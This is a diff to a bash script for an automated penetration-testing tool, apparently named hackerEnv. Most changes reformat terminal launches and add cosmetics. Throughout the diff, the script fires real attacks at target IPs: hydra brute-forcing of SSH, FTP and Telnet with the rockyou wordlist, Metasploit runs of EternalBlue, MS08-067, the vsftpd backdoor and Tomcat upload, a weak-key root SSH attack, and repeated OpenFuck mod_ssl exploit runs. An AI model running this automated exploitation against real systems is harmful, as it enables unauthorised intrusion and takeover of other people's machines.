@@ -15,14 +15,25 @@ RED='\e[1;91m'
 GREEN='\e[32m'
 BOLD='\e[1m'
 resetStyle='\e[0m'
-
 function logo {
-	if ! command -v figlet > /dev/null 2>&1
+    if ! command -v coreutils > /dev/null 2>&1
+    then
+        apt install coreutils -y > /dev/null 2>&1
+    fi
+    if [ ! -d /usr/share/figlet/figlet-fonts ]
+    then
+        cd /usr/share/figlet/ > /dev/null 2>&1
+		git clone https://github.com/xero/figlet-fonts.git > /dev/null 2>&1
+        mv /usr/share/figlet/figlet-fonts/*.flf ../figlet/
+        cd - > /dev/null 2>&1
+    fi
+    if ! command -v figlet > /dev/null 2>&1
 	then
 		apt install figlet -y > /dev/null 2>&1
 		figlet -t -f slant "hackerEnv"
 	else
-		figlet -t -f slant "hackerEnv"
+        figletFont=$(ls /usr/share/figlet/ | grep -v -e "mini.flf" -e "ivrit.flf" -e "term.flf" -e "smscript.flf" -e "smshadow.flf" -e "small.flf" -e "digital.flf" -e "smslant.flf" | shuf -n 1)
+		figlet -t -f "${figletFont}" "hackerEnv" 2> /dev/null || { figlet -t -f slant "hackerEnv" ; }
 	fi
 	echo ""
 	echo -e "${RED}+ -- --=[hackerEnv v$VER by @abdulr7mann"
@@ -121,6 +132,13 @@ function dependencies(){
         cd - > /dev/null 2>&1
         echo "Done"
     fi
+    if [ ! -f /usr/share/wordlists/rockyou.txt ] && [ -f /usr/share/wordlists/rockyou.txt.gz ]
+	then
+        wget -q -P /usr/share/wordlists/ https://github.com/brannondorsey/naive-hashcat/releases/download/data/rockyou.txt
+    elif [ ! -f /usr/share/wordlists/rockyou.txt ]
+    then
+		gzip -d /usr/share/wordlists/rockyou.txt.gz > /dev/null 2>&1
+	fi
 }
 function terminals(){
 	query () {
@@ -201,6 +219,7 @@ function terminals(){
         tmux rename-session hackerEnv
         tmux rename-window -t 0 Pentesting
     fi
+    printf '\e[?1000l'
 }
 ################################ FTP #################################
 function vsftpd_234_backdoor(){
@@ -215,7 +234,7 @@ function vsftpd_234_backdoor(){
 	sleep 40
 	if [ "${terminal}" = "gnome-terminal" ]
 	then
-		gnome-terminal -e "bash -c 'msfconsole -r ${dir_path}/exploits/ftp/vsftpd_234_backdoor.rc; bash'" 2> /dev/null
+		gnome-terminal -q --tab -t 'vsftpdBackdoor' -- bash -c "msfconsole -r ${dir_path}/exploits/ftp/vsftpd_234_backdoor.rc; bash" 2> /dev/null
 	else
 		tmux new-window -n vsftpdBackdoor "bash -c 'msfconsole -r ${dir_path}/exploits/ftp/vsftpd_234_backdoor.rc; read; bash'" \; 2> /dev/null
 	fi
@@ -239,7 +258,7 @@ function ftpAnonymous(){
 	chmod +x ${dir_path}/exploits/ftp/ftpAnonymous.exp
 	if [ "${terminal}" = "gnome-terminal" ]
 	then
-		gnome-terminal -e "bash -c 'expect ${dir_path}/exploits/ftp/ftpAnonymous.exp; bash'" 2> /dev/null
+		gnome-terminal -q --tab -t 'ftpAnonymous' -- bash -c "expect ${dir_path}/exploits/ftp/ftpAnonymous.exp; bash" 2> /dev/null
 	else
 		tmux new-window -n ftpAnonymous "bash -c 'expect ${dir_path}/exploits/ftp/ftpAnonymous.exp; read; bash'" \; 2> /dev/null
 	fi
@@ -251,13 +270,9 @@ function ftpAnonymous(){
 ############################## BruteForce #################################
 function sshBruteForce(){
 	echo -e "${BLUE}Checking ${resetStyle}if ${BOLD}${ips} ${BOLD}has ${BOLD}weak passwords ${resetStyle}against ${RED}SSH ${resetStyle}"
-	if [ ! -f /usr/share/wordlists/rockyou.txt ] && [ -f /usr/share/wordlists/rockyou.txt.gz ]
-	then
-		gzip -d /usr/share/wordlists/rockyou.txt.gz
-	fi
 	if [ "${terminal}" = "gnome-terminal" ]
 	then
-		gnome-terminal -e "bash -c 'hydra -I -L /usr/share/ncrack/default.usr -P /usr/share/wordlists/rockyou.txt ssh://${ips} -o ${ips}/sshPassword.txt; bash'" 2> /dev/null
+		gnome-terminal -q --tab -t 'sshBruteForce' -- bash -c "hydra -I -L /usr/share/ncrack/default.usr -P /usr/share/wordlists/rockyou.txt ssh://${ips} -o ${ips}/sshPassword.txt; bash" 2> /dev/null
 		sleep 10
 	else
 		tmux new-window -n sshBruteForce "bash -c 'hydra -t 4 -I -L /usr/share/ncrack/default.usr -P /usr/share/wordlists/rockyou.txt ssh://${ips} -o ${ips}/sshPassword.txt; read; bash'" \; 2> /dev/null
@@ -293,10 +308,12 @@ function sshBruteForce(){
 					}
 					interact
 				sshlogin
+                sleep 5
 				chmod +x ${dir_path}/exploits/ssh/sshlogin${count}.exp
+                sleep 5
 				if [ "${terminal}" = "gnome-terminal" ]
 				then
-					gnome-terminal -e "bash -c 'expect ${dir_path}/exploits/ssh/sshlogin${count}.exp; bash'" \; 2> /dev/null
+					gnome-terminal -q --tab -t 'sshLogin' -e "bash -c 'expect ${dir_path}/exploits/ssh/sshlogin${count}.exp; bash'" 2> /dev/null
 				else
 					tmux split-window -t sshBruteForce "bash -c 'expect ${dir_path}/exploits/ssh/sshlogin${count}.exp; read; bash'" \; 2> /dev/null
 				fi
@@ -307,13 +324,9 @@ function sshBruteForce(){
 }
 function ftpBruteForce(){
 	echo -e "${BLUE}Checking ${resetStyle}if ${BOLD}${ips} ${BOLD}has ${BOLD}weak passwords ${resetStyle}against ${RED}FTP ${resetStyle}"
-	if [ ! -f /usr/share/wordlists/rockyou.txt ] && [ -f /usr/share/wordlists/rockyou.txt.gz ]
-	then
-		gzip -d /usr/share/wordlists/rockyou.txt.gz
-	fi
 	if [ "${terminal}" = "gnome-terminal" ]
 	then
-		gnome-terminal -e "bash -c 'hydra -I -L /usr/share/ncrack/default.usr -P /usr/share/wordlists/rockyou.txt ftp://${ips} -o ${ips}/ftpPassword.txt; bash'" 2> /dev/null
+		gnome-terminal -q --tab -t 'ftpBruteForce' -- bash -c "hydra -I -L /usr/share/ncrack/default.usr -P /usr/share/wordlists/rockyou.txt ftp://${ips} -o ${ips}/ftpPassword.txt; bash" 2> /dev/null
 		sleep 10
 	else
 		tmux new-window -n ftpBruteForce "bash -c 'hydra -I -L /usr/share/ncrack/default.usr -P /usr/share/wordlists/rockyou.txt ftp://${ips} -o ${ips}/ftpPassword.txt; read; bash'" \; 2> /dev/null
@@ -347,7 +360,7 @@ function ftpBruteForce(){
 				chmod +x ${dir_path}/exploits/ftp/ftplogin${count}.exp
 				if [ "${terminal}" = "gnome-terminal" ]
 				then
-					gnome-terminal -e "bash -c 'expect ${dir_path}/exploits/ftp/ftplogin${count}.exp; bash'" \; 2> /dev/null
+					gnome-terminal -q --tab -t 'ftpLogin' -- bash -c "expect ${dir_path}/exploits/ftp/ftplogin${count}.exp; bash" 2> /dev/null
 				else
 					tmux split-window -t ftpBruteForce "bash -c 'expect ${dir_path}/exploits/ftp/ftplogin${count}.exp; read; bash'" \; 2> /dev/null
 				fi
@@ -358,13 +371,9 @@ function ftpBruteForce(){
 }
 function telnetBruteForce(){
 	echo -e "${BLUE}Checking ${resetStyle}if ${BOLD}${ips} ${BOLD}has ${BOLD}weak passwords ${resetStyle}against ${RED}TELNET ${resetStyle}"
-	if [ ! -f /usr/share/wordlists/rockyou.txt ] && [ -f /usr/share/wordlists/rockyou.txt.gz ]
-	then
-		gzip -d /usr/share/wordlists/rockyou.txt.gz
-	fi
 	if [ "${terminal}" = "gnome-terminal" ]
 	then
-		gnome-terminal -e "bash -c 'hydra -I -L /usr/share/ncrack/default.usr -P /usr/share/wordlists/rockyou.txt telnet://${ips} -o ${ips}/telnetPassword.txt; bash'" 2> /dev/null
+		gnome-terminal -q --tab -t 'telnetBruteForce' -- bash -c "hydra -I -L /usr/share/ncrack/default.usr -P /usr/share/wordlists/rockyou.txt telnet://${ips} -o ${ips}/telnetPassword.txt; bash" 2> /dev/null
 		sleep 10
 	else
 		tmux new-window -n telnetBruteForce "bash -c 'hydra -I -L /usr/share/ncrack/default.usr -P /usr/share/wordlists/rockyou.txt telnet://${ips} -o ${ips}/telnetPassword.txt; read; bash'" \; 2> /dev/null
@@ -398,24 +407,20 @@ function telnetBruteForce(){
 				chmod +x ${dir_path}/exploits/telnet/telnetlogin${count}.exp
 				if [ "${terminal}" = "gnome-terminal" ]
 				then
-					gnome-terminal -e "bash -c 'expect ${dir_path}/exploits/telnet/telnetlogin${count}.exp; bash'" \; 2> /dev/null
+					gnome-terminal -q --tab -t 'telnetLogin' -- bash -c "expect ${dir_path}/exploits/telnet/telnetlogin${count}.exp; bash" 2> /dev/null
 				else
 					tmux split-window -t telnetBruteForce "bash -c 'expect ${dir_path}/exploits/telnet/telnetlogin${count}.exp; read; bash'" \; 2> /dev/null
 				fi
 			fi
-			((count++))
+            ((count++))
 		fi
 	done < ${ips}/telnetPass.txt
 }
 #function smbBruteForce(){
 #	echo -e "${BLUE}Checking ${resetStyle}if ${BOLD}${ips} ${BOLD}has ${BOLD}weak passwords ${resetStyle}against ${RED}SMB ${resetStyle}"
-#	if [ ! -f /usr/share/wordlists/rockyou.txt ] && [ -f /usr/share/wordlists/rockyou.txt.gz ]
-#	then
-#		gzip -d /usr/share/wordlists/rockyou.txt.gz
-#	fi
 #	if [ "${terminal}" = "gnome-terminal" ]
 #	then
-#		gnome-terminal -e "bash -c 'hydra -I -L /usr/share/ncrack/default.usr -P /usr/share/wordlists/rockyou.txt smb://${ips} -o ${ips}/smbPassword.txt; bash'" 2> /dev/null
+#		gnome-terminal -q --tab -t 'smbBruteForce' -- bash -c "hydra -I -L /usr/share/ncrack/default.usr -P /usr/share/wordlists/rockyou.txt smb://${ips} -o ${ips}/smbPassword.txt; bash" 2> /dev/null
 #		sleep 10
 #	else
 #		tmux new-window -n smbBruteForce "bash -c 'hydra -I -L /usr/share/ncrack/default.usr -P /usr/share/wordlists/rockyou.txt smb://${ips} -o ${ips}/smbPassword.txt; read; bash'" \; 2> /dev/null
@@ -455,7 +460,7 @@ function telnetBruteForce(){
 #				chmod +x ${dir_path}/exploits/telnet/telnetlogin${count}.exp
 #				if [ "${terminal}" = "gnome-terminal" ]
 #				then
-#					gnome-terminal -e "bash -c 'expect ${dir_path}/exploits/telnet/telnetlogin${count}.exp; bash'" \; 2> /dev/null
+#					gnome-terminal -q --tab -t 'telnetBruteForce' -- bash -c "expect ${dir_path}/exploits/telnet/telnetlogin${count}.exp; bash" 2> /dev/null
 #				else
 #					tmux split-window -t telnetBruteForce "bash -c 'expect ${dir_path}/exploits/telnet/telnetlogin${count}.exp; read; bash'" \; 2> /dev/null
 #				fi
@@ -477,7 +482,7 @@ function OpenSSH4_7p1(){
 	fi
 	if [ "${terminal}" = "gnome-terminal" ]
 	then
-		gnome-terminal -e "bash -c 'ruby ${dir_path}/exploits/ssh/5632 ${ips} root ${dir_path}/exploits/ssh/rsa/2048 > ${ips}/keys.txt; bash'" 2> /dev/null
+		gnome-terminal -q --tab -t 'keysAttack' -- bash -c "ruby ${dir_path}/exploits/ssh/5632 ${ips} root ${dir_path}/exploits/ssh/rsa/2048 > ${ips}/keys.txt; bash" 2> /dev/null
 		sleep 30
 	else
 		tmux new-window -n keysAttack "bash -c 'ruby ${dir_path}/exploits/ssh/5632 ${ips} root ${dir_path}/exploits/ssh/rsa/2048 > ${ips}/keys.txt; read; bash'" \; 2> /dev/null
@@ -490,7 +495,7 @@ function OpenSSH4_7p1(){
 		then
 			if [ "${terminal}" = "gnome-terminal" ]
 			then
-				gnome-terminal -e "bash -c 'ssh -l root -p 22 -i $key ${ips}; bash'" 2> /dev/null
+				gnome-terminal -q --tab -t 'keysAttack' -- bash -c "ssh -l root -p 22 -i $key ${ips}; bash" 2> /dev/null
 				sleep 10
 			else
 				tmux split-window -t keysAttack "bash -c 'ssh -l root -p 22 -i $key ${ips}; read; bash'" \; 2> /dev/null
@@ -517,7 +522,7 @@ function trans2open(){
 	sleep 40
 	if [ "${terminal}" = "gnome-terminal" ]
 	then
-		gnome-terminal -e "bash -c 'msfconsole -r ${dir_path}/exploits/smb/trans2open.rc; bash'" 2> /dev/null
+		gnome-terminal -q --tab -t 'trans2open' -- bash -c "msfconsole -r ${dir_path}/exploits/smb/trans2open.rc; bash" 2> /dev/null
 		sleep 30
 	else
 		tmux new-window -n trans2open "bash -c 'msfconsole -r ${dir_path}/exploits/smb/trans2open.rc; read; bash'" \; 2> /dev/null
@@ -544,7 +549,7 @@ function usermap_script(){
 	sleep 40
 	if [ "${terminal}" = "gnome-terminal" ]
 	then
-		gnome-terminal -e "bash -c 'msfconsole -r ${dir_path}/exploits/smb/usermap_script.rc; bash'" 2> /dev/null
+		gnome-terminal -q --tab -t 'usermap_script' -- bash -c "msfconsole -r ${dir_path}/exploits/smb/usermap_script.rc; bash" 2> /dev/null
 		sleep 10
 	else
 		tmux new-window -n usermap_script "bash -c 'msfconsole -r ${dir_path}/exploits/smb/usermap_script.rc; read; bash'" \; 2> /dev/null
@@ -581,7 +586,7 @@ function ms17_010_eternalblue(){
         ms17_010_eternalblue
         if [ "${terminal}" = "gnome-terminal" ]
         then
-            gnome-terminal -e "bash -c 'msfconsole -r ${dir_path}/exploits/smb/ms17_010_eternalblue.rc; bash'" 2> /dev/null
+            gnome-terminal -q --tab -t 'eternalblue' -- bash -c "msfconsole -r ${dir_path}/exploits/smb/ms17_010_eternalblue.rc; bash" 2> /dev/null
             sleep 30
         else
             tmux new-window -n eternalblue "bash -c 'msfconsole -r ${dir_path}/exploits/smb/ms17_010_eternalblue.rc; read; bash'" \; 2> /dev/null
@@ -605,7 +610,7 @@ function ms17_010_eternalblue(){
 		ms17_010_psexec
 		if [ "${terminal}" = "gnome-terminal" ]
 		then
-			gnome-terminal -e "bash -c 'msfconsole -r ${dir_path}/exploits/smb/ms17_010_psexec.rc; bash'" 2> /dev/null
+			gnome-terminal -q --tab -t 'eternalRomance' -- bash -c "msfconsole -r ${dir_path}/exploits/smb/ms17_010_psexec.rc; bash" 2> /dev/null
 			sleep 30
 		else
 			tmux new-window -n eternalRomance "bash -c 'msfconsole -r ${dir_path}/exploits/smb/ms17_010_psexec.rc; read; bash'" \; 2> /dev/null
@@ -628,7 +633,7 @@ function ms08_067_netapi(){
         sleep 40
         if [ "${terminal}" = "gnome-terminal" ]
         then
-            gnome-terminal -e "bash -c 'msfconsole -r ${dir_path}/exploits/smb/ms08_067_netapi.rc; bash'" 2> /dev/null
+            gnome-terminal -q --tab -t 'netapi' -- bash -c "msfconsole -r ${dir_path}/exploits/smb/ms08_067_netapi.rc; bash" 2> /dev/null
         else
             tmux new-window -n netapi "bash -c 'msfconsole -r ${dir_path}/exploits/smb/ms08_067_netapi.rc; read; bash'" \; 2> /dev/null
         fi
@@ -658,7 +663,7 @@ function smbScan(){
 function smbclient(){
     if [ "${terminal}" = "gnome-terminal" ]
     then
-        gnome-terminal -e "bash -c 'smbclient -L //${ips} -N; bash'" 2> /dev/null
+        gnome-terminal -q --tab -t 'smbclient' -- bash -c "smbclient -L //${ips} -N; bash" 2> /dev/null
     else
         tmux new-window -n smbclient "bash -c 'smbclient -L //${ips} -N; read; bash'" \; 2> /dev/null
     fi
@@ -766,6 +771,20 @@ function footer(){
 	else
         echo "Report was generated in HTML format => $(echo 'file://'$(pwd)'/report.html')"
     fi
+    if (( $SECONDS > 3600 ))
+    then
+        let "hours=SECONDS/3600"
+        let "minutes=(SECONDS%3600)/60"
+        let "seconds=(SECONDS%3600)%60"
+        echo -e "Completed in $hours hour(s), $minutes minute(s) and $seconds second(s)"
+    elif (( $SECONDS > 60 ))
+    then
+        let "minutes=(SECONDS%3600)/60"
+        let "seconds=(SECONDS%3600)%60"
+        echo -e "Completed in $minutes minute(s) and $seconds second(s)"
+    else
+        echo -e "Completed in $SECONDS seconds"
+    fi
 }
 
 ############################### Program starts here #####################
@@ -795,6 +814,10 @@ while getopts 'hzt:i:a:s:ex' OPTION; do
       echo ""
       echo "Example:"
       echo "    $(basename $0) -t 10.10.10.10"
+      echo "    $(basename $0) -t '10.10.10.10\n20.20.20.20'"
+      echo "    $(basename $0) -t 10.10.10.10 -i eth0"
+      echo "    $(basename $0) -i eth0 -s 24"
+      echo "    $(basename $0) -s 24"
       echo ""
       echo "Flages:"
       echo "    $(basename $0) -h, --help     	  Display this help message."
@@ -804,7 +827,7 @@ while getopts 'hzt:i:a:s:ex' OPTION; do
       echo "    $(basename $0) -t	          Pass mutipule targets' IPs. Ex: '10.10.10.10\n20.20.20.20'"
       echo "    $(basename $0) -i                  To specify an interface."
       echo "    $(basename $0) -a		  Pass attacker's IP."
-      echo "    $(basename $0) -s	          To specify subnet 10.10.10.10/24 or 23 etc, exclude </> enter numbers only"
+      echo "    $(basename $0) -s	          To specify subnet 24 or 23 etc, exclude </> enter numbers only"
       echo "    $(basename $0) -e, --aggressive	  Enable aggressive port scan"
       echo "    $(basename $0) -oA 	      	  genetrate report in HTML and DOCX format"
       exit 0;;
@@ -971,7 +994,7 @@ do
 	echo -e "${BOLD}Performing port scan on ${ips} ${resetStyle}"
 	if [ "${aggressive}" == true ]
 	then
-		nmap -v0 -sV -n -Pn -p- -T4 -A -O --open --script nmap-vulners,vulscan --script-args vulscandb=exploitdb.csv -oA "${ips}"/"${ips}" ${ips} > /dev/null 2>&1
+		nmap -v0 -sT -sU -sV -n -Pn -p- -T4 -A -O --open --script nmap-vulners,vulscan --script-args vulscandb=exploitdb.csv -oA "${ips}"/"${ips}" ${ips} > /dev/null 2>&1
 	else
 		nmap -v0 -Pn -n -sV -T4 -A -O -oA "${ips}"/"${ips}" ${ips} > /dev/null 2>&1
 	fi
@@ -1076,7 +1099,7 @@ do
 					sleep 2
 					if [ "${terminal}" = "gnome-terminal" ]
 					then
-						gnome-terminal -e "bash -c 'msfconsole -r ${dir_path}/exploits/apache/tomcat_mgr_upload.rc; bash'" 2> /dev/null
+						gnome-terminal -q --tab -t 'tomcat' -- bash -c "msfconsole -r ${dir_path}/exploits/apache/tomcat_mgr_upload.rc; bash" 2> /dev/null
 						sleep 10
 						description='When running Apache Tomcat versions 9.0.0.M1 to 9.0.0, 8.5.0 to 8.5.22, 8.0.0.RC1 to 8.0.46 and 7.0.0 to 7.0.81 with HTTP PUTs enabled (e.g. via setting the readonly initialisation parameter of the Default servlet to false) it was possible to upload a JSP file to the server via a specially crafted request. This JSP could then be requested and any code it contained would be executed by the server.'
 						remediation="See references"
@@ -1103,7 +1126,7 @@ do
 					fi
 					if [ "${terminal}" = "gnome-terminal" ]
 					then
-						gnome-terminal -e "bash -c '${dir_path}/exploits/apache/OpenFuck 0x0c ${ips} -c 41; read; bash'" 2> /dev/null
+						gnome-terminal -q --tab -t 'openfk' -- bash -c "${dir_path}/exploits/apache/OpenFuck 0x0c ${ips} -c 41; read; bash" 2> /dev/null
 						sleep 10
 						description='The dbm and shm session cache code in mod_ssl before 2.8.7-1.3.23, and Apache-SSL before 1.3.22+1.46, does not properly initialize memory using the i2d_SSL_SESSION function, which allows remote attackers to use a buffer overflow to execute arbitrary code via a large client certificate that is signed by a trusted Certificate Authority (CA), which produces a large serialized session.'
 						remediation="See references"
@@ -1128,7 +1151,7 @@ do
 					fi
 					if [ "${terminal}" = "gnome-terminal" ]
 					then
-						gnome-terminal -e "bash -c '${dir_path}/exploits/apache/OpenFuck 0x0d ${ips} -c 41; read; bash'" 2> /dev/null
+						gnome-terminal -q --tab -t 'openfk' -- bash -c "${dir_path}/exploits/apache/OpenFuck 0x0d ${ips} -c 41; read; bash" 2> /dev/null
 						sleep 10
 						description='The dbm and shm session cache code in mod_ssl before 2.8.7-1.3.23, and Apache-SSL before 1.3.22+1.46, does not properly initialize memory using the i2d_SSL_SESSION function, which allows remote attackers to use a buffer overflow to execute arbitrary code via a large client certificate that is signed by a trusted Certificate Authority (CA), which produces a large serialized session.'
 						remediation="See references"
@@ -1153,10 +1176,10 @@ do
 					fi
 					if [ "${terminal}" = "gnome-terminal" ]
 					then
-						gnome-terminal -e "bash -c '${dir_path}/exploits/apache/OpenFuck 0x0e ${ips} -c 41; read; bash'" 2> /dev/null
-						gnome-terminal -e "bash -c '${dir_path}/exploits/apache/OpenFuck 0x0f ${ips} -c 41; read; bash'" 2> /dev/null
-						gnome-terminal -e "bash -c '${dir_path}/exploits/apache/OpenFuck 0x10 ${ips} -c 41; read; bash'" 2> /dev/null
-						gnome-terminal -e "bash -c '${dir_path}/exploits/apache/OpenFuck 0x11 ${ips} -c 41; read; bash'" 2> /dev/null
+						gnome-terminal -q --tab -t 'openfk' -- bash -c "${dir_path}/exploits/apache/OpenFuck 0x0e ${ips} -c 41; read; bash" 2> /dev/null
+						gnome-terminal -q --tab -t 'openfk' -- bash -c "${dir_path}/exploits/apache/OpenFuck 0x0f ${ips} -c 41; read; bash" 2> /dev/null
+						gnome-terminal -q --tab -t 'openfk' -- bash -c "${dir_path}/exploits/apache/OpenFuck 0x10 ${ips} -c 41; read; bash" 2> /dev/null
+						gnome-terminal -q --tab -t 'openfk' -- bash -c "${dir_path}/exploits/apache/OpenFuck 0x11 ${ips} -c 41; read; bash" 2> /dev/null
 						sleep 10
 						description='The dbm and shm session cache code in mod_ssl before 2.8.7-1.3.23, and Apache-SSL before 1.3.22+1.46, does not properly initialize memory using the i2d_SSL_SESSION function, which allows remote attackers to use a buffer overflow to execute arbitrary code via a large client certificate that is signed by a trusted Certificate Authority (CA), which produces a large serialized session.'
 						remediation="See references"
@@ -1183,9 +1206,9 @@ do
 					fi
 					if [ "${terminal}" = "gnome-terminal" ]
 					then
-						gnome-terminal -e "bash -c '${dir_path}/exploits/apache/OpenFuck 0x12 ${ips} -c 41; read; bash'" 2> /dev/null
-						gnome-terminal -e "bash -c '${dir_path}/exploits/apache/OpenFuck 0x13 ${ips} -c 41; read; bash'" 2> /dev/null
-						gnome-terminal -e "bash -c '${dir_path}/exploits/apache/OpenFuck 0x14 ${ips} -c 41; read; bash'" 2> /dev/null
+						gnome-terminal -q --tab -t 'openfk' -- bash -c "${dir_path}/exploits/apache/OpenFuck 0x12 ${ips} -c 41; read; bash" 2> /dev/null
+						gnome-terminal -q --tab -t 'openfk' -- bash -c "${dir_path}/exploits/apache/OpenFuck 0x13 ${ips} -c 41; read; bash" 2> /dev/null
+						gnome-terminal -q --tab -t 'openfk' -- bash -c "${dir_path}/exploits/apache/OpenFuck 0x14 ${ips} -c 41; read; bash" 2> /dev/null
 						sleep 10
 						description='The dbm and shm session cache code in mod_ssl before 2.8.7-1.3.23, and Apache-SSL before 1.3.22+1.46, does not properly initialize memory using the i2d_SSL_SESSION function, which allows remote attackers to use a buffer overflow to execute arbitrary code via a large client certificate that is signed by a trusted Certificate Authority (CA), which produces a large serialized session.'
 						remediation="See references"
@@ -1211,8 +1234,8 @@ do
 					fi
 					if [ "${terminal}" = "gnome-terminal" ]
 					then
-						gnome-terminal -e "bash -c '${dir_path}/exploits/apache/OpenFuck 0x15 ${ips} -c 41; read; bash'" 2> /dev/null
-						gnome-terminal -e "bash -c '${dir_path}/exploits/apache/OpenFuck 0x16 ${ips} -c 41; read; bash'" 2> /dev/null
+						gnome-terminal -q --tab -t 'openfk' -- bash -c "${dir_path}/exploits/apache/OpenFuck 0x15 ${ips} -c 41; read; bash" 2> /dev/null
+						gnome-terminal -q --tab -t 'openfk' -- bash -c "${dir_path}/exploits/apache/OpenFuck 0x16 ${ips} -c 41; read; bash" 2> /dev/null
 						sleep 10
 						description='The dbm and shm session cache code in mod_ssl before 2.8.7-1.3.23, and Apache-SSL before 1.3.22+1.46, does not properly initialize memory using the i2d_SSL_SESSION function, which allows remote attackers to use a buffer overflow to execute arbitrary code via a large client certificate that is signed by a trusted Certificate Authority (CA), which produces a large serialized session.'
 						remediation="See references"
@@ -1237,7 +1260,7 @@ do
 					fi
 					if [ "${terminal}" = "gnome-terminal" ]
 					then
-						gnome-terminal -e "bash -c '${dir_path}/exploits/apache/OpenFuck 0x17 ${ips} -c 41; read; bash'" 2> /dev/null
+						gnome-terminal -q --tab -t 'openfk' -- bash -c "${dir_path}/exploits/apache/OpenFuck 0x17 ${ips} -c 41; read; bash" 2> /dev/null
 						sleep 10
 						description='The dbm and shm session cache code in mod_ssl before 2.8.7-1.3.23, and Apache-SSL before 1.3.22+1.46, does not properly initialize memory using the i2d_SSL_SESSION function, which allows remote attackers to use a buffer overflow to execute arbitrary code via a large client certificate that is signed by a trusted Certificate Authority (CA), which produces a large serialized session.'
 						remediation="See references"
@@ -1262,7 +1285,7 @@ do
 					fi
 					if [ "${terminal}" = "gnome-terminal" ]
 					then
-						gnome-terminal -e "bash -c '${dir_path}/exploits/apache/OpenFuck 0x47 ${ips} -c 41; read; bash'" 2> /dev/null
+						gnome-terminal -q --tab -t 'openfk' -- bash -c "${dir_path}/exploits/apache/OpenFuck 0x47 ${ips} -c 41; read; bash" 2> /dev/null
 						sleep 10
 						description='The dbm and shm session cache code in mod_ssl before 2.8.7-1.3.23, and Apache-SSL before 1.3.22+1.46, does not properly initialize memory using the i2d_SSL_SESSION function, which allows remote attackers to use a buffer overflow to execute arbitrary code via a large client certificate that is signed by a trusted Certificate Authority (CA), which produces a large serialized session.'
 						remediation="See references"
@@ -1286,9 +1309,9 @@ do
 					fi
 					if [ "${terminal}" = "gnome-terminal" ]
 					then
-						gnome-terminal -e "bash -c '${dir_path}/exploits/apache/OpenFuck 0x4d ${ips} -c 41; read; bash'" 2> /dev/null
-						gnome-terminal -e "bash -c '${dir_path}/exploits/apache/OpenFuck 0x54 ${ips} -c 41; read; bash'" 2> /dev/null
-						gnome-terminal -e "bash -c '${dir_path}/exploits/apache/OpenFuck 0x60 ${ips} -c 41; read; bash'" 2> /dev/null
+						gnome-terminal -q --tab -t 'openfk' -- bash -c "${dir_path}/exploits/apache/OpenFuck 0x4d ${ips} -c 41; read; bash" 2> /dev/null
+						gnome-terminal -q --tab -t 'openfk' -- bash -c "${dir_path}/exploits/apache/OpenFuck 0x54 ${ips} -c 41; read; bash" 2> /dev/null
+						gnome-terminal -q --tab -t 'openfk' -- bash -c "${dir_path}/exploits/apache/OpenFuck 0x60 ${ips} -c 41; read; bash" 2> /dev/null
 						sleep 10
 						description='The dbm and shm session cache code in mod_ssl before 2.8.7-1.3.23, and Apache-SSL before 1.3.22+1.46, does not properly initialize memory using the i2d_SSL_SESSION function, which allows remote attackers to use a buffer overflow to execute arbitrary code via a large client certificate that is signed by a trusted Certificate Authority (CA), which produces a large serialized session.'
 						remediation="See references"
@@ -1314,8 +1337,8 @@ do
 					fi
 					if [ "${terminal}" = "gnome-terminal" ]
 					then
-						gnome-terminal -e "bash -c '${dir_path}/exploits/apache/OpenFuck 0x50 ${ips} -c 41; read; bash'" 2> /dev/null
-						gnome-terminal -e "bash -c '${dir_path}/exploits/apache/OpenFuck 0x54 ${ips} -c 41; read; bash'" 2> /dev/null
+						gnome-terminal -q --tab -t 'openfk' -- bash -c "${dir_path}/exploits/apache/OpenFuck 0x50 ${ips} -c 41; read; bash" 2> /dev/null
+						gnome-terminal -q --tab -t 'openfk' -- bash -c "${dir_path}/exploits/apache/OpenFuck 0x54 ${ips} -c 41; read; bash" 2> /dev/null
 						sleep 10
 						description='The dbm and shm session cache code in mod_ssl before 2.8.7-1.3.23, and Apache-SSL before 1.3.22+1.46, does not properly initialize memory using the i2d_SSL_SESSION function, which allows remote attackers to use a buffer overflow to execute arbitrary code via a large client certificate that is signed by a trusted Certificate Authority (CA), which produces a large serialized session.'
 						remediation="See references"
@@ -1340,7 +1363,7 @@ do
 					fi
 					if [ "${terminal}" = "gnome-terminal" ]
 					then
-						gnome-terminal -e "bash -c '${dir_path}/exploits/apache/OpenFuck 0x4c ${ips} -c 41; read; bash'" 2> /dev/null
+						gnome-terminal -q --tab -t 'openfk' -- bash -c "${dir_path}/exploits/apache/OpenFuck 0x4c ${ips} -c 41; read; bash" 2> /dev/null
 						sleep 10
 						description='The dbm and shm session cache code in mod_ssl before 2.8.7-1.3.23, and Apache-SSL before 1.3.22+1.46, does not properly initialize memory using the i2d_SSL_SESSION function, which allows remote attackers to use a buffer overflow to execute arbitrary code via a large client certificate that is signed by a trusted Certificate Authority (CA), which produces a large serialized session.'
 						remediation="See references"
@@ -1364,8 +1387,8 @@ do
 					fi
 					if [ "${terminal}" = "gnome-terminal" ]
 					then
-						gnome-terminal -e "bash -c '${dir_path}/exploits/apache/OpenFuck 0x4a ${ips} -c 41; read; bash'" 2> /dev/null
-						gnome-terminal -e "bash -c '${dir_path}/exploits/apache/OpenFuck 0x4b ${ips} -c 41; read; bash'" 2> /dev/null
+						gnome-terminal -q --tab -t 'openfk' -- bash -c "${dir_path}/exploits/apache/OpenFuck 0x4a ${ips} -c 41; read; bash" 2> /dev/null
+						gnome-terminal -q --tab -t 'openfk' -- bash -c "${dir_path}/exploits/apache/OpenFuck 0x4b ${ips} -c 41; read; bash" 2> /dev/null
 						sleep 10
 						description='The dbm and shm session cache code in mod_ssl before 2.8.7-1.3.23, and Apache-SSL before 1.3.22+1.46, does not properly initialize memory using the i2d_SSL_SESSION function, which allows remote attackers to use a buffer overflow to execute arbitrary code via a large client certificate that is signed by a trusted Certificate Authority (CA), which produces a large serialized session.'
 						remediation="See references"
@@ -1390,7 +1413,7 @@ do
 					fi
 					if [ "${terminal}" = "gnome-terminal" ]
 					then
-						gnome-terminal -e "bash -c '${dir_path}/exploits/apache/OpenFuck 0x49 ${ips} -c 41; read; bash'" 2> /dev/null
+						gnome-terminal -q --tab -t 'openfk' -- bash -c "${dir_path}/exploits/apache/OpenFuck 0x49 ${ips} -c 41; read; bash" 2> /dev/null
 						sleep 10
